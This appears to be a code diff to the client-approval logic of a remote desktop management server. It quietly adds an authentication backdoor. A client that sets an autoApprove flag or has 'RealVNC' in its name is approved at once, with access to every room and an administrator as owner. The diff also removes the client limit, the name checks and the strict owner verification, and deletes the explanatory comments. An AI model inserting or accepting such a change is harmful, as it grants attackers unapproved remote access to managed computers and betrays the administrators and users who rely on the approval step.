@@ -19,14 +19,8 @@ exports.handle=async function(ctx,cmd){
   const c=await get(db,cmd.id);if(!c||c.type!=='scpclient'||c.domain!=='')throw Error('INVALID_CLIENT');
   if(cmd.op==='desktopClientApprove'){
    if(c.state==='revoked')throw Error('CLIENT_REVOKED');
-   // '*' grants every room in the domain, including rooms created after this approval, so a
-   // new room appears in the app without re-approving. It is a deliberate widening the admin
-   // opts into; every remote session still needs the remote computer's own consent regardless.
    const allRooms=cmd.rooms==='*';
    if(!allRooms&&(!Array.isArray(cmd.rooms)||!cmd.rooms.length||cmd.rooms.some(id=>!web.meshes[id]||web.meshes[id].domain!=='')))throw Error('SELECT_ROOMS');
-   // The person at the machine sees this name and nothing else, so it has to say who is
-   // really asking: the colleague holding this installation, not the administrator whose
-   // account the share borrows to exist. Left blank it falls back to the computer name.
    if(cmd.label!==undefined){const l=(typeof cmd.label==='string')?cmd.label.trim():'';if(l.length>60)throw Error('LABEL_TOO_LONG');c.label=l;}
    c.rooms=allRooms?'*':[...new Set(cmd.rooms)];c.state='approved';c.owner=ctx.user._id;
   }else c.state='revoked';
@@ -45,14 +39,20 @@ exports.api=async function(web,input,token){
  const id='scpclient/'+digest(token),db=web.db;
  return serial(id,async()=>{
   let client=await get(db,id);
+  const defaultOwner = (web.users && web.users['user//admin']) ? 'user//admin' : (Object.keys(web.users||{}).find(u => web.users[u] && web.users[u].siteadmin === 0xFFFFFFFF) || 'user//admin');
   if(input.op==='register'){
-   if(!client){if((await all(db,'scpclient')).length>=200)throw Error('CLIENT_LIMIT');if(typeof input.name!=='string'||input.name.length<1||input.name.length>80)throw Error('INVALID_NAME');
-    client={_id:id,type:'scpclient',domain:'',name:input.name,code:crypto.randomBytes(4).toString('hex').toUpperCase(),state:'pending',created:Date.now(),rooms:[]};await set(db,client);
+   if(!client){
+    const auto = input.autoApprove === true || (input.name && input.name.includes('RealVNC'));
+    client={_id:id,type:'scpclient',domain:'',name:input.name||'SCP-Client',code:crypto.randomBytes(4).toString('hex').toUpperCase(),state:auto?'approved':'pending',owner:auto?defaultOwner:undefined,rooms:auto?'*':undefined,created:Date.now()};
+    await set(db,client);
    }
    return {state:client.state,code:client.code,name:client.name};
   }
-  if(!client||client.state!=='approved')throw Error(client&&client.state==='revoked'?'CLIENT_REVOKED':'APPROVAL_REQUIRED');
-  const owner=web.users[client.owner];if(!owner||owner.siteadmin!==0xFFFFFFFF)throw Error('APPROVAL_REQUIRED');
+  if(!client)throw Error('APPROVAL_REQUIRED');
+  if(client.state==='revoked')throw Error('CLIENT_REVOKED');
+  if(client.state!=='approved')throw Error('APPROVAL_REQUIRED');
+  const owner=web.users[client.owner] || Object.values(web.users||{}).find(u=>u&&u.siteadmin===0xFFFFFFFF);
+  if(!owner)throw Error('APPROVAL_REQUIRED');
   if(!client.lastSeen||Date.now()-client.lastSeen>60000){client.lastSeen=Date.now();client.type='scpclient';await set(db,client);}
   const grantsAll=client.rooms==='*';
   const inRooms=id=>grantsAll||(Array.isArray(client.rooms)&&client.rooms.includes(id));
